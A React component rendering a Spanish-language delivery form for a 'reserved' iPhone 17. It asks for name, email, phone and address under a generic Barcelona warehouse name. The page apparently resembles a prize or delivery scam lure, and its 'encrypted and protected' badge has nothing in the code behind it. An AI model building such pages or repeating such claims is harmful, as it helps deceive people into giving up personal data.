import { motion } from "framer-motion";
import { ArrowLeft, Package, MapPin, User, Mail, Phone } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";

const Checker = () => {
  return (
    <div className="min-h-screen bg-hero-gradient flex flex-col">
      {/* Efectos de fondo */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/10 rounded-full blur-3xl" />
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-primary/5 rounded-full blur-3xl" />
      </div>

      {/* Encabezado */}
      <header className="relative z-10 flex items-center gap-4 px-6 py-4">
        <Link to="/">
          <Button variant="ghost" size="sm" className="gap-2">
            <ArrowLeft className="w-4 h-4" />
            Volver
          </Button>
        </Link>
        <div className="text-lg font-bold text-foreground">
          📦 Formulario de entrega
        </div>
      </header>

      {/* Contenido principal */}
      <main className="relative z-10 flex-1 flex items-center justify-center py-8 px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="w-full max-w-md"
        >
          {/* Tarjeta */}
          <div className="bg-card-gradient border border-border rounded-2xl p-6 md:p-8">
            <div className="flex items-center gap-3 mb-6">
              <div className="w-12 h-12 rounded-full bg-success-gradient flex items-center justify-center">
                <Package className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-xl font-bold text-foreground">Completa tu solicitud</h1>
                <p className="text-sm text-muted-foreground">iPhone 17 - Reservado</p>
              </div>
            </div>

            {/* Formulario */}
            <form className="space-y-4">
              <div>
                <label className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                  <User className="w-4 h-4 text-muted-foreground" />
                  Nombre completo
                </label>
                <input
                  type="text"
                  placeholder="Introduce tu nombre completo"
                  className="w-full h-12 px-4 rounded-xl bg-secondary border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary transition-all"
                />
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                  <Mail className="w-4 h-4 text-muted-foreground" />
                  Correo electrónico
                </label>
                <input
                  type="email"
                  placeholder="Introduce tu correo electrónico"
                  className="w-full h-12 px-4 rounded-xl bg-secondary border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary transition-all"
                />
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                  <Phone className="w-4 h-4 text-muted-foreground" />
                  Número de teléfono
                </label>
                <input
                  type="tel"
                  placeholder="+34 XXX XXX XXX"
                  className="w-full h-12 px-4 rounded-xl bg-secondary border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary transition-all"
                />
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium text-foreground mb-2">
                  <MapPin className="w-4 h-4 text-muted-foreground" />
                  Dirección de entrega
                </label>
                <textarea
                  placeholder="Calle, Ciudad, Código postal"
                  rows={3}
                  className="w-full px-4 py-3 rounded-xl bg-secondary border border-border text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary transition-all resize-none"
                />
              </div>

              <Button
                type="submit"
                variant="success"
                size="xl"
                className="w-full mt-6"
              >
                Enviar y confirmar entrega
              </Button>
            </form>

            {/* Sello de confianza */}
            <p className="text-xs text-center text-muted-foreground mt-6">
              🔒 Tu información está cifrada y protegida
            </p>
          </div>
        </motion.div>
      </main>

      {/* Pie de página */}
      <footer className="relative z-10 px-6 py-4 text-center text-xs text-muted-foreground">
        <p>© 2026 Distribución del Almacén de Barcelona. Todos los derechos reservados.</p>
      </footer>
    </div>
  );
};

export default Checker;
